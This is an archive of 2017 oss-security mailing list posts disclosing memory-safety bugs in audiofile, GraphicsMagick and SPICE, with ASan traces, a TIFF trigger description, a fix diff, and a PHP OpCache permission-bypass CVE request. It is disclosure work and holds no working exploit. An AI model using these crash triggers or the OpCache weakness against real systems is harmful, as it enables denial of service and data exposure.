0x7f0add7e6a7a is located 6 bytes to the left of global variable 'indexTable' defined in 
'/tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:116:21' (0x7f0add7e6a80) of size 16
0x7f0add7e6a7a is located 40 bytes to the right of global variable 'stepTable' defined in 
'/tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:122:22' (0x7f0add7e69a0) of size 178
SUMMARY: AddressSanitizer: global-buffer-overflow /tmp/portage/media-libs/audiofile-0.3.6-r1/work/audiofile-0.3.6/libaudiofile/modules/IMA.cpp:144:13 in decodeSample(adpcmState&, 
unsigned char)
Shadow bytes around the buggy address:
  0x0fe1dbaf4cf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe1dbaf4d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 07 f9 f9
  0x0fe1dbaf4d10: f9 f9 f9 f9 00 00 00 00 00 00 00 04 f9 f9 f9 f9
  0x0fe1dbaf4d20: 00 00 00 00 00 00 01 f9 f9 f9 f9 f9 00 00 01 f9
  0x0fe1dbaf4d30: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0fe1dbaf4d40: 00 00 00 00 00 00 00 00 00 00 02 f9 f9 f9 f9[f9]
  0x0fe1dbaf4d50: 00 00 f9 f9 f9 f9 f9 f9 00 00 03 f9 f9 f9 f9 f9
  0x0fe1dbaf4d60: 00 00 05 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00
  0x0fe1dbaf4d70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0fe1dbaf4d80: 00 00 00 00 01 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
  0x0fe1dbaf4d90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1779==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00183-audiofile-globaloverflow-decodeSample

Timeline:
2017-02-20: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-global-buffer-overflow-in-decodesample-ima-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489401102.9439_10.Morbo,U=41356:2, -->

##### Agostino Sarubbo <ago@gentoo.org>, `1639079.ZQkYUiMST9@blackgate`

```
On Sunday 26 February 2017 11:49:46 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2017/02/20/audiofile-global-buffer-overflow-in-> decodesample-ima-cpp

This is CVE-2017-6829

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in readValue (FileHandle.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_56.NdNdNx,U=7804:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `869975.355078594-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz with a wav file as input produced an heap overflow.

The complete ASan output:

# sfinfo $FILE
==6051==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a00001f708 at pc 0x0000004513de bp 0x7ffc71379b20 sp 0x7ffc713792d0
WRITE of size 2 at 0x61a00001f708 thread T0
    #0 0x4513dd in read /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:765
    #1 0x7fd944373b2c in bool readValue(File*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/FileHandle.cpp:353:12
    #2 0x7fd944373b2c in bool readSwap(File*, short*, int) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/FileHandle.cpp:375
    #3 0x7fd944373b2c in _init /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/FileHandle.cpp:397
    #4 0x7fd94439ce2f in WAVEFile::parseFormat(Tag const&, unsigned int) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/WAVE.cpp:289:5
    #5 0x7fd9443a1568 in WAVEFile::readInit(_AFfilesetup*) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/WAVE.cpp:733:13
    #6 0x7fd9443b4fb9 in _afOpenFile(int, File*, char const*, _AFfilehandle**, _AFfilesetup*) 
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:356:15
    #7 0x7fd9443b6331 in afOpenFile /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:217:6
    #8 0x50a278 in printfileinfo /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/printinfo.c:45:22
    #9 0x509f98 in main /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/sfinfo.c:113:4
    #10 0x7fd94347f78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #11 0x419b68 in _init (/usr/bin/sfinfo+0x419b68)

0x61a00001f708 is located 0 bytes to the right of 1160-byte region [0x61a00001f280,0x61a00001f708)
allocated by thread T0 here:
    #0 0x4d2928 in malloc /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64
    #1 0x7fd942ede687 in operator new(unsigned long) (/usr/lib/gcc/x86_64-pc-linux-gnu/6.3.0/libstdc++.so.6+0xb2687)
    #2 0x7fd9443b4d63 in _afOpenFile(int, File*, char const*, _AFfilehandle**, _AFfilesetup*) 
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:337:15
    #3 0x7fd9443b6331 in afOpenFile /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:217:6
    #4 0x50a278 in printfileinfo /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/printinfo.c:45:22
    #5 0x509f98 in main /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/sfinfo.c:113:4
    #6 0x7fd94347f78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow 
/tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:765 in read
Shadow bytes around the buggy address:
  0x0c347fffbe90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c347fffbee0: 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==6051==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00135-audiofile-heapoverflow-readValue

Timeline:
2017-01-30: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-readvalue-filehandle-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489529193.18167_1.Morbo,U=41730:2, -->

##### Solar Designer <solar@openwall.com>, `20170314220336.GB14618@openwall.com`

```
On Sun, Feb 26, 2017 at 11:46:23AM +0000, Agostino Sarubbo wrote:
> ==6051==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a00001f708 at pc 0x0000004513de bp 0x7ffc71379b20 sp 0x7ffc713792d0
> WRITE of size 2 at 0x61a00001f708 thread T0
>     #0 0x4513dd in read /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:765
>     #1 0x7fd944373b2c in bool readValue(File*, short*) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/FileHandle.cpp:353:12
>     #2 0x7fd944373b2c in bool readSwap(File*, short*, int) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/FileHandle.cpp:375
>     #3 0x7fd944373b2c in _init /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/FileHandle.cpp:397
>     #4 0x7fd94439ce2f in WAVEFile::parseFormat(Tag const&, unsigned int) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/WAVE.cpp:289:5

Agostino asked the list moderators to post to this thread that the above
is CVE-2017-6828.

Alexander

```

</details>
<details>
<summary><strong>[oss-security] audiofile: heap-based buffer overflow in MSADPCM::initializeCoefficients (MSADPCM.cpp)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Important/cur/1489529117.18104_4.Morbo,U=16860:2,S -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `923996.603905351-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
audiofile is a C-based library for reading and writing audio files in many common formats.

A fuzz with a wav file as input produced an heap overflow.

The complete ASan output:

# sfinfo $FILE
==6096==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a00001f708 at pc 0x0000004bbc35 bp 0x7ffd65dbabf0 sp 0x7ffd65dba3a0                                                       
READ of size 33872 at 0x61a00001f708 thread T0                                                                                                                                                 
    #0 0x4bbc34 in __asan_memcpy /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413                                                  
    #1 0x7efec209d7df in MSADPCM::initializeCoefficients() /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/modules/MSADPCM.cpp:369:3                              
    #2 0x7efec209d7df in MSADPCM::createDecompress(Track*, File*, bool, bool, long*) 
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/modules/MSADPCM.cpp:387      
    #3 0x7efec2070da7 in ModuleState::initFileModule(_AFfilehandle*, Track*) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/modules/ModuleState.cpp:72:18        
    #4 0x7efec207189d in ModuleState::init(_AFfilehandle*, Track*) /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/modules/ModuleState.cpp:98:6                   
    #5 0x7efec2053969 in _afOpenFile(int, File*, char const*, _AFfilehandle**, _AFfilesetup*) 
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:396:18
    #6 0x7efec2054331 in afOpenFile /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:217:6                                                           
    #7 0x50a278 in printfileinfo /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/printinfo.c:45:22                                                                  
    #8 0x509f98 in main /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/sfinfo.c:113:4                                                                              
    #9 0x7efec111d78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                     
    #10 0x419b68 in _init (/usr/bin/sfinfo+0x419b68)                                                                                                                                           
                                                                                                                                                                                               
0x61a00001f708 is located 0 bytes to the right of 1160-byte region [0x61a00001f280,0x61a00001f708)                                                                                             
allocated by thread T0 here:                                                                                                                                                                   
    #0 0x4d2928 in malloc /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64                                                          
    #1 0x7efec0b7c687 in operator new(unsigned long) (/usr/lib/gcc/x86_64-pc-linux-gnu/6.3.0/libstdc++.so.6+0xb2687)                                                                           
    #2 0x7efec2052d63 in _afOpenFile(int, File*, char const*, _AFfilehandle**, _AFfilesetup*) 
/tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:337:15
    #3 0x7efec2054331 in afOpenFile /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/openclose.cpp:217:6                                                           
    #4 0x50a278 in printfileinfo /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/printinfo.c:45:22                                                                  
    #5 0x509f98 in main /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/sfcommands/sfinfo.c:113:4                                                                              
    #6 0x7efec111d78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289                                                                     
                                                                                                                                                                                               
SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413 in __asan_memcpy                  
Shadow bytes around the buggy address:                                                                                                                                                         
  0x0c347fffbe90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbea0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbeb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbec0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c347fffbed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0c347fffbee0: 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c347fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==6096==ABORTING

Affected version:
0.3.6

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00136-audiofile-heapoverflow-MSADPCM-initializeCoefficients

Timeline:
2017-01-30: bug discovered and reported to upstream
2017-02-20: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/02/20/audiofile-heap-based-buffer-overflow-in-msadpcminitializecoefficients-msadpcm-cpp

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489529111.18104_1.Morbo,U=41727:2,T -->

##### Solar Designer <solar@openwall.com>, `20170314220026.GA14618@openwall.com`

```
On Sun, Feb 26, 2017 at 11:45:35AM +0000, Agostino Sarubbo wrote:
> ==6096==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61a00001f708 at pc 0x0000004bbc35 bp 0x7ffd65dbabf0 sp 0x7ffd65dba3a0
> READ of size 33872 at 0x61a00001f708 thread T0
>     #0 0x4bbc34 in __asan_memcpy /tmp/portage/sys-devel/llvm-3.9.1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413
>     #1 0x7efec209d7df in MSADPCM::initializeCoefficients() /tmp/portage/media-libs/audiofile-0.3.6-r3/work/audiofile-0.3.6/libaudiofile/modules/MSADPCM.cpp:369:3
>     #2 0x7efec209d7df in MSADPCM::createDecompress(Track*, File*, bool, bool, long*)

Agostino asked the list moderators to post to this thread that the above
is CVE-2017-6827.

Alexander

P.S. Next time I'd prefer another moderator to handle this sort of
requests, if any, since I don't care about CVEs much.  I mostly care
about security issues getting brought to this list, which was already
the case.

```

</details>
<details>
<summary><strong>[oss-security] audiofile: multiple crashes</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_54.NdNdNx,U=7802:2,ST -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `987433.508128987-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Hello all.

I discovered multiple crashes in the audiofile library.
The maintainer was informed privately, I didn't see reactions and all details are public on my blog.
I posted them to the cveform too, but I didn't get response.
I'll send update if something will change. 

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

</details>

## graphicsmagick
<details>
<summary><strong>[oss-security] Re: GraphicsMagick heap out of bounds write issue</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144004.28364_1.NdNdNx,U=7749:2,T -->

##### Bob Friesenhahn <bfriesen@simple.dallas.tx.us>, `alpine.GSO.2.20.1702232109380.9710@freddy.simplesystems.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
GraphicsMagick versions up to 1.3.25 encounter a write beyond an 
allocated heap buffer when reading CMYKA TIFF files which claim to 
offer fewer samples per pixel than required.

This is the tiffinfo description of the problematic TIFF file:

TIFF Directory at offset 0x808 (2056)
   Image Width: 34 Image Length: 48
   Bits/Sample: 8
   Sample Format: unsigned integer
   Compression Scheme: None
   Photometric Interpretation: separated
   Extra Samples: 1<unassoc-alpha>
   Orientation: row 0 top, col 0 lhs
   Samples/Pixel: 2
   Rows/Strip: 32
   Planar Configuration: single image plane

The fix for this is Mercurial changeset 14998:6156b4c2992d which may 
be viewed at SourceForge via this link:

https://sourceforge.net/p/graphicsmagick/code/ci/6156b4c2992d855ece6079653b3b93c3229fc4b8/

A minimal patch to correct the problem is attached.

This issue was reported to us on February 15, 2017 by Valon Chu.

Bob
-- 
Bob Friesenhahn
bfriesen@simple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/

```

</details>
<details><summary>Additional Parts</summary>

```
diff -r 0392c4305a43 -r 6156b4c2992d coders/tiff.c
--- a/coders/tiff.c	Sun Jan 29 10:04:57 2017 -0600
+++ b/coders/tiff.c	Thu Feb 23 21:06:50 2017 -0600
@@ -1230,8 +1230,8 @@
                   case 0:
                     if (samples_per_pixel == 1)
                       *quantum_type=GrayQuantum;
-                      else
-                        *quantum_type=RedQuantum;
+                    else
+                      *quantum_type=RedQuantum;
                     break;
                   case 1:
                     *quantum_type=GreenQuantum;
@@ -1411,12 +1411,12 @@
               }
             else
               {
-                if (image->matte)
+                if (image->matte && samples_per_pixel >= 5)
                   {
                     *quantum_type=CMYKAQuantum;
                     *quantum_samples=5;
                   }
-                else
+                else if (samples_per_pixel >= 4)
                   {
                     *quantum_type=CMYKQuantum;
                     *quantum_samples=4;

```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144004.28364_10.NdNdNx,U=7758:2,T -->

##### Bob Friesenhahn <bfriesen@simple.dallas.tx.us>, `alpine.GSO.2.20.1702240821470.9710@freddy.simplesystems.org`

```
I would like to ammend this report in that the situation is a read 
beyond an allocated heap buffer rather than a write beyond the end of 
an allocated heap buffer as was originally reported.  The application 
may crash but should not be otherwise compromised.

Bob

On Thu, 23 Feb 2017, Bob Friesenhahn wrote:

> GraphicsMagick versions up to 1.3.25 encounter a write beyond an allocated 
> heap buffer when reading CMYKA TIFF files which claim to offer fewer samples 
> per pixel than required.
>
> This is the tiffinfo description of the problematic TIFF file:
>
> TIFF Directory at offset 0x808 (2056)
>  Image Width: 34 Image Length: 48
>  Bits/Sample: 8
>  Sample Format: unsigned integer
>  Compression Scheme: None
>  Photometric Interpretation: separated
>  Extra Samples: 1<unassoc-alpha>
>  Orientation: row 0 top, col 0 lhs
>  Samples/Pixel: 2
>  Rows/Strip: 32
>  Planar Configuration: single image plane
>
> The fix for this is Mercurial changeset 14998:6156b4c2992d which may be 
> viewed at SourceForge via this link:
>
> https://sourceforge.net/p/graphicsmagick/code/ci/6156b4c2992d855ece6079653b3b93c3229fc4b8/
>
> A minimal patch to correct the problem is attached.
>
> This issue was reported to us on February 15, 2017 by Valon Chu.
>
> Bob
>

-- 
Bob Friesenhahn
bfriesen@simple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379282.2379_132.Morbo,U=37971:2, -->

##### Bob Friesenhahn <bfriesen@simple.dallas.tx.us>, `alpine.GSO.2.20.1702280817550.12318@freddy.simplesystems.org`

```
This problem has been issued CVE-2017-6335.

The original reporter has tried to post CVE-assignment information to 
the list but the mail has not made it through yet.

Bob

On Fri, 24 Feb 2017, Bob Friesenhahn wrote:

> I would like to ammend this report in that the situation is a read beyond an 
> allocated heap buffer rather than a write beyond the end of an allocated heap 
> buffer as was originally reported.  The application may crash but should not 
> be otherwise compromised.
>
> Bob
>
> On Thu, 23 Feb 2017, Bob Friesenhahn wrote:
>
>> GraphicsMagick versions up to 1.3.25 encounter a write beyond an allocated 
>> heap buffer when reading CMYKA TIFF files which claim to offer fewer 
>> samples per pixel than required.
>> 
>> This is the tiffinfo description of the problematic TIFF file:
>> 
>> TIFF Directory at offset 0x808 (2056)
>>  Image Width: 34 Image Length: 48
>>  Bits/Sample: 8
>>  Sample Format: unsigned integer
>>  Compression Scheme: None
>>  Photometric Interpretation: separated
>>  Extra Samples: 1<unassoc-alpha>
>>  Orientation: row 0 top, col 0 lhs
>>  Samples/Pixel: 2
>>  Rows/Strip: 32
>>  Planar Configuration: single image plane
>> 
>> The fix for this is Mercurial changeset 14998:6156b4c2992d which may be 
>> viewed at SourceForge via this link:
>> 
>> https://sourceforge.net/p/graphicsmagick/code/ci/6156b4c2992d855ece6079653b3b93c3229fc4b8/
>> 
>> A minimal patch to correct the problem is attached.
>> 
>> This issue was reported to us on February 15, 2017 by Valon Chu.
>> 
>> Bob
>> 
>
>

-- 
Bob Friesenhahn
bfriesen@simple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/

```

</details>

## spice-server
<details>
<summary><strong>[oss-security] spice-server: CVE-2016-9577, CVE-2016-9578: remote DoS and buffer overflow from crafted messages</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487850524.12837_3.NdNdNx,U=7660:2,T -->

##### Doran Moppert <dmoppert@redhat.com>, `20170223075619.GA10527@sin.redhat.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Two vulnerabilities in the server component of SPICE
<https://spice-space.org/> were recently assigned CVEs by Red Hat -
distros got notified during embargo, but I neglected to follow up here:

 - CVE-2016-9577 spice: Buffer overflow in main_channel_alloc_msg_rcv_buf
   <https://bugzilla.redhat.com/show_bug.cgi?id=1401603>

 - CVE-2016-9578 spice: Remote DoS via crafted message
   <https://bugzilla.redhat.com/show_bug.cgi?id=1399566>

Both of these attacks are accessible to unauthenticated attackers that
can make connections to the SPICE server.  CVE-2016-9577 may lead to
code execution (heap overflow), while the impact of CVE-2016-9578 is
limited to denial of service.

Both issues were reported by Frediano Ziglio, and fixed in the following
upstream commits:

https://cgit.freedesktop.org/spice/spice/commit/?id=ec124b982abcd23364963ffcd4c370b1ec962fc9
https://cgit.freedesktop.org/spice/spice/commit/?id=e16eee1d8be00b186437bf61e4e1871cd8d0211a
https://cgit.freedesktop.org/spice/spice/commit/?id=1d3e26c0ee75712fa4bbbcfa09d8d5866b66c8af


-- 
Doran Moppert
Red Hat Product Security

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.22 (GNU/Linux)

iQIcBAEBCgAGBQJYrpWjAAoJEGohqWcZR7qpP2cP/0e91YerC0+6t/b3ggqUd+r3
oEE3k8KbLyOX7mndPAtCXhMHl6nnu5lhVOsUMhuiGRElLzHv+IZfAwZG80hoW31t
9MGZH3BtZApUHfyl07s9lxPuBpjbfthkruENLsgrd4hseo83TLkr2igl3UQJTLcv
3t9S2u7n5V45pCbG0weYhNkeCHC/ZBC5QSMcP/HsEsimEu8mExWJv9U38pqK91qd
uzQQbpfXJl1OKitlWo4tKpXsQ37oPRMa/1LVnbMG9HUdDvFBLMeOE6AfD/VaF4LU
w+h/5NLUUMT4c2wzGpw68Aeu7M4VhLtBZbOAcRcObV59S7ccnAMYYToLUiN5oDo5
WtjPDWOScHdEUG5wYtm1GGGezBM5dGsi4gKh7eJDGAeKl5rGOrwRn+m8t/ZvrXRl
z4T/lyvAUtIlJrYYm3R9fmtuXLOygtnWGrcyfSriMdBMrOqowzg/ntbrO5SxhtqC
o7Nqf0X6RuaV7hR5m+a5nlI3oG5o6KJ7Zg7ZM9E6CCOYO+L/5bMPRJWUDrOqXIG6
0GSXtR42HTE4Y+V3Vxiox7BY4db2BTzLZ0niB30LSXsjEKPY3jjywoUByVDM9KAC
gs7ZV7AM3yQhT0zsEyBhrm4begzVBtHfTD2tOLkbLnymR4RpnT8avZ23fSByBI+J
h55ha/1Sm7uSDQtoThDq
=AKwu
-----END PGP SIGNATURE-----


```

</details>

---

</details>

## php
<details>
<summary><strong>[oss-security] Re: CVE Request: PHP with Zend OPCache code permission/sensitive data protection vulnerability</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488282780.6135_81.NdNdNx,U=7937:2,ST -->

##### php-dev@coydogsoftware.net, `20170227225258.GA13043@sliver.coydogsoftware.net`

```
Hello,

This never got a response the first time I submitted it. PHP maintainers
recognize the vulnerability, and added an undocumented non-default
setting which mitigates it. Please assign a CVE if possible.

To briefly summarize, in PHP SAPI's where PHP interpreters share a
common parent process (eg. Apache mod_php and PHP-FPM), Zend OpCache
creates a shared memory object owned by the common parent during
initialization. Child PHP processes inherit the SHM descriptor, using it
to cache and retrieve compiled script bytecode ("opcode" in PHP jargon).
Cache keys vary depending on configuration, but filename is a central
key component, and compiled opcode can generally be run if a script's
filename is known or can be guessed.

Many common shared hosting configurations change EUID in child processes
to enforce privilege separation among hosted users. In these scenarios,
default Zend OpCache behavior defeats script file permissions by sharing
a single SHM cache among all child PHP processes.

PHP scripts often contain sensitive information: Think of CMS
configurations where reading or running another user's script usually
means gaining privileges to the CMS database.

 
AFFECTED VERSIONS:
PHP7 < 7.0.14 and PHP5 < 5.6.29. Later versions are still vulnerable by
default unless opcache.validate_permission=1 is enabled.

AFFECTED COMPONENT:
Zend OpCache

VULNERABILITY TYPE:
Code permission/sensitive information disclosure

